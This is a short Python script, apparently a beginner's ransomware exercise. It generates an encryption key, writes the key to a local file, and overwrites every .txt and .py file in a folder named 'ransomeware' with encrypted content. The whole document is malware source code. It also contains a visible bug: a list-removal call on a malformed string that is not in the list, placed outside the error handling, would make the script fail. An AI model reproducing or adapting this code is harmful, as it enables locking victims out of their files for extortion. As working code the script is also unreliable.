from cryptography.fernet import Fernet
import os

key=Fernet.generate_key()

keys=Fernet(key)
ra=[]

with open("thekey.key","wb") as lock:
    lock.write(key)
  

for files in  os.listdir("ransomeware"):
    if files.endswith("txt") or files.endswith("py"):
        path=os.path.join("ransomeware",files)
        ra.append(path)
        ra.remove("'ransomeware\\ransome.py',")

        try:

            with open(path,"rb") as red:
                content= red.read()

            files_encrypted=keys.encrypt(content)
            with open(path,"wb") as enc:
                enc.write(files_encrypted)    
        except Exception as e:
                print(f"Failed to encrypt {files}: {e}")
